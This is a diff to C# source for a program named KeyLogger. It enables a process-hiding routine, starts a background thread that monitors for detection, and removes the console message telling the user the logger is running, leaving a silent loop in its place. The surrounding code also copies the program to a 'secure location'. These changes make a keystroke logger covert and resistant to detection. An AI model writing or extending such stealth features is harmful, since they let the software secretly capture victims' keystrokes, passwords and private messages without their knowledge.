@@ -18,6 +18,7 @@ class KeyLogger
     private static StringBuilder logBuffer = new StringBuilder();
     private static readonly object bufferLock = new object();
     private static bool isLogging = false;
+    private static bool isRunning = true;
     private static Timer logTimer;
     private static Timer cleanupTimer;
 
@@ -134,11 +135,17 @@ class KeyLogger
         
             CopyToSecureLocation();
 
-            //SetupProcessHiding();
+            SetupProcessHiding();
+
+            Thread monitorThread = new Thread(MonitorForDetection);
+            monitorThread.IsBackground = true;
+            monitorThread.Start();
 
             // Keep the application running
-            Console.WriteLine("KeyLogger started. Press Ctrl+C to stop.");
-            Console.ReadLine();
+            while (isRunning)
+            {
+                Thread.Sleep(1000);
+            }
         }
         catch (Exception ex)
         {
